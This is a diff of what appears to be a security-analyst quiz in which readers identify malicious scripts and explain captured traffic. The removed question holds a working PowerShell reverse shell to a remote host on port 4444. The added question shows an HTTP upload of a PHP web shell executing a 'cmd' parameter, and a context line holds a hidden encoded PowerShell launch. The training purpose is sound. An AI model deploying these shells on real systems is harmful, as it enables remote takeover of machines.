@@ -117,18 +117,25 @@ Command Line: powershell.exe -nop -w hidden -encodedCommand <base64_string>
 Parent Process: wscript.exe (PID: 4567)  
 User: DOMAIN\johndoe  
 ```
-## 7. Identify language and script purpose.
+## 7. Your network sensor captured following HTTP request. Can you explain what is possibly going on?
 ```
-$client = New-Object System.Net.Sockets.TCPClient("sys-internall-tools-staging.io", 4444)
-$stream = $client.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
-$reader = New-Object System.IO.StreamReader($stream)
-while ($true) {
-    $command = $reader.ReadLine()
-    $output = Invoke-Expression $command
-    $writer.WriteLine($output)
-    $writer.Flush()
+POST /upload.php HTTP/1.1
+Host: groupon.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.1 Safari/537.36
+Content-Type: multipart/form-data; boundary=---------------------------123456789012345678901234
+Content-Length: 453
+
+-----------------------------123456789012345678901234
+Content-Disposition: form-data; name="file"; filename="info.php"
+Content-Type: application/x-php
+
+<?php
+// Execute
+if(isset($_REQUEST['cmd'])) {
+    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 }
+?>
+-----------------------------123456789012345678901234--
 ```
 
 ## 8. Identify language and script purpose.
